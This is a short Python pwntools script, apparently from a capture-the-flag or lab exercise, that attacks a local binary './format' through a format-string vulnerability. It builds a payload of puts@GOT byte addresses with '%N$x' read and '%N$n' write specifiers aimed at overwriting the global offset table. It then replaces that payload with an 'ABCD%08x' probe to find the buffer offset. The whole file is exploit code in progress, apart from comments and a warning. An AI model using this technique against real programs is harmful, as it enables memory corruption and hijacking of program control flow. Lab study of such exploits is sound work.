#!/usr/bin/env python3

from pwn import *

binary = "./format"
context.binary = binary

elf = ELF("./format")
# total length of the argument
pad = 1605

# address of puts@got
puts_got = elf.got['puts']

# index to use in printf format string
# originally 175 but it seems to be shifted in this payload

# !!!WARNING: check if the  buf_idx is correct on your machine by inspecting the output of the script!!!
buf_idx = 178

# format string for printing hex values (spaces added for better printing)
read_fmt  = " %{}$x "
# format string for writing values in memory
write_fmt = "%{}$n"

fmt = read_fmt

# write the addresses of each individual byte from the got address
payload  = pack(puts_got+0)
payload += pack(puts_got+1)
payload += pack(puts_got+3)
payload += pack(puts_got+4)
# Use format strings to print/write at the addresses above
payload += fmt.format(buf_idx+0).encode('utf-8')
payload += fmt.format(buf_idx+1).encode('utf-8')
payload += fmt.format(buf_idx+2).encode('utf-8')
payload += fmt.format(buf_idx+3).encode('utf-8')

# pad payload until 1605
fmt = payload + b"A" * (pad-len(payload))
fmt = b'ABCD' + b'%08x\n' * 999 + b'\n'

io = process(["./format", fmt])

plm = io.recvall()
pos = plm.find(b'78383025') // 4
print(pos)
print(plm[pos*4-32:pos*4+8])
# print(plm.decode())
# io.interactive()
